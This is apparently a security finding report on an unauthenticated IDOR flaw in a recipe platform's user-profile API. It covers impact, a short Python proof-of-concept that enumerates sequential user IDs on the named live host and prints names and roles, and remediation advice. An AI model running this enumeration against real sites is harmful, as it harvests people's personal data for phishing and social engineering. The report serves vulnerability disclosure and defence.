# IDOR - Unauthenticated User Profile Enumeration

**ID:** vuln-0004
**Severity:** MEDIUM
**Found:** 2026-07-14 08:35:02 UTC
**Target:** https://api.axross-recipe.com/users/{id}
**Endpoint:** /users/{id}
**Method:** GET
**CWE:** CWE-639
**CVSS:** 5.3

## Description

The user profile API endpoint at GET /users/{id} does not require authentication and returns user data including name, avatar URL, introduction, role, and transfer status. Sequential user IDs can be enumerated to harvest user information across the platform.

## Impact

An attacker can enumerate all users on the platform and collect their profile information including names, avatar URLs, and organizational roles. This information can be used for targeted phishing attacks, social engineering, or to map the organization's structure. The sequential ID pattern makes enumeration trivial.

## Technical Analysis

The Rails API backend exposes user profiles at /users/{id} without any authentication or authorization checks. The endpoint returns detailed user information for any valid user ID. The IDs are sequential integers, making bulk enumeration straightforward. While email addresses are not directly exposed in the response, the combination of name, avatar, role, and organizational metadata provides significant information for social engineering and targeted attacks.

## Proof of Concept

1. Send a GET request to https://api.axross-recipe.com/users/1 without any authentication
2. The server returns the full user profile for user ID 1
3. Increment the ID to enumerate all users: /users/2, /users/3, etc.
4. User data returned includes: id, name, avatar, introduction, role, transferred status
5. Over 5000 user IDs were confirmed to exist and return data

```
#!/usr/bin/env python3
"""IDOR PoC for Axross Recipe User Enumeration"""
import requests

BASE = "https://api.axross-recipe.com/users"

print("Enumerating users without authentication...")
found = 0
for user_id in range(1, 50):
    resp = requests.get(f"{BASE}/{user_id}")
    if resp.status_code == 200:
        data = resp.json()
        name = data.get("name", "N/A")
        role = data.get("role", "N/A")
        print(f"  User {user_id}: name='{name}', role='{role}'")
        found += 1

print(f"\nFound {found} accessible user profiles without authentication")
print("VULNERABLE: Unauthenticated user data access confirmed")
```

## Remediation

1. Require authentication for all /users/{id} endpoints.
2. Implement authorization checks to ensure users can only access their own profile data (or profiles they are authorized to view).
3. Consider using non-sequential identifiers (UUIDs) instead of sequential integers for user IDs.
4. Implement rate limiting on the user endpoint to prevent bulk enumeration.
5. Return a generic 404 response for both non-existent and unauthorized user IDs to prevent user enumeration.
